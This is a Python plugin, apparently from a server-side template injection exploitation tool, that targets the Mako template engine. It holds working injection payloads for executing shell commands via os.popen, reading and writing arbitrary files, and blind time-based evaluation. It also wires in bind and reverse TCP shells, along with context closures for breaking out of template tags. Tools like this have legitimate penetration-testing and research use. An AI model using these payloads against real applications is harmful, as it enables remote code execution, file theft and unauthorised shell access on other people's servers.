from core import languages
from core.plugin import Plugin
from utils.loggers import log
from utils import rand


class Mako(Plugin):

    actions = {
        'render' : {
            'render': '${%(code)s}',
            'header': '${%(header)s}',
            'trailer': '${%(trailer)s}'
        },
        'write' : {
            'call' : 'evaluate',
            'write' : """open("%(path)s", 'ab+').write(__import__("base64").urlsafe_b64decode('%(chunk)s'))""",
            'truncate' : """open("%(path)s", 'w').close()"""
        },
        'read' : {
            'call': 'render',
            'read' : """<%% x=__import__("base64").b64encode(open("%(path)s", "rb").read()) %%>${x}"""
        },
        'md5' : {
            'call': 'render',
            'md5': """<%% x=__import__("hashlib").md5(open("%(path)s", 'rb').read()).hexdigest() %%>${x}"""
        },
        'evaluate' : {
            'call': 'render',
            'evaluate': '<%% %(code)s %%>'
        },
        'blind' : {
            'call': 'evaluate_blind',
            'bool_true' : '"a".join("ab") == "aab"',
            'bool_false' : 'False'
        },
        'evaluate_blind' : {
            'call': 'inject',
            'evaluate_blind': """<%% %(code)s and __import__("time").sleep(%(delay)i) %%>"""
        },
        'tcp_shell' : {
            'call' : 'execute_blind',
            'tcp_shell': languages.bash_tcp_shell
        },
        'reverse_tcp_shell' : {
            'call': 'execute_blind',
            'reverse_tcp_shell' : languages.bash_reverse_tcp_shell
        },
        'execute_blind' : {
            'call': 'evaluate_blind',
            'execute_blind': """import os; x=os.popen("%(code)s && %(delay)i").read()"""
        },
        'execute' : {
            'call' : 'render',
            'execute' : '<%% import os; x=os.popen("%(code)s").read() %%>${x}'
        }

    }

    contexts = [

        # Text context, no closures
        { 'level': 0 },

        # Normal reflecting tag ${}
        { 'level': 1, 'prefix': '%(closure)s}', 'suffix' : '', 'closures' : languages.python_ctx_closures },

        # Code blocks
        # This covers <% %s %>, <%! %s %>, <% %s=1 %>
        { 'level': 1, 'prefix': '%(closure)s%%>', 'suffix' : '<%%#', 'closures' : languages.python_ctx_closures },

        # If and for blocks
        # % if %s:\n% endif
        # % for a in %s:\n% endfor
        { 'level': 5, 'prefix': '%(closure)s#\n', 'suffix' : '\n', 'closures' : languages.python_ctx_closures },

        # Mako blocks
        { 'level': 5, 'prefix' : '</%%doc>', 'suffix' : '<%%doc>' },
        { 'level': 5, 'prefix' : '</%%def>', 'suffix' : '<%%def name="t(x)">', 'closures' : languages.python_ctx_closures },
        { 'level': 5, 'prefix' : '</%%block>', 'suffix' : '<%%block>', 'closures' : languages.python_ctx_closures },
        { 'level': 5, 'prefix' : '</%%text>', 'suffix' : '<%%text>', 'closures' : languages.python_ctx_closures},

    ]

    def detect_engine(self):

        randA = rand.randstr_n(2)
        randB = rand.randstr_n(2)

        payload = '${"%s".join("%s")}' % (randA, randB)
        expected = randA.join(randB)

        if expected == self.render(payload):
            self.set('language', 'python')
            self.set('engine', 'mako')
            self.set('evaluate', 'python')        
            self.set('execute', True)


    def detect_eval(self):

        # Check eval capabilities only if engine has been found
        if not self.get('engine'):
            return

        payload = """<% import sys, os; x=os.name; y=sys.platform; %>${x}-${y}"""
        self.set('evaluate', 'python')
        self.set('os', self.render(payload))

    def detect_blind_engine(self):

        if not self.get('blind'):
            return

        self.set('language', 'python')
        self.set('engine', 'mako')
        self.set('evaluate', 'python')
        self.set('execute', True)
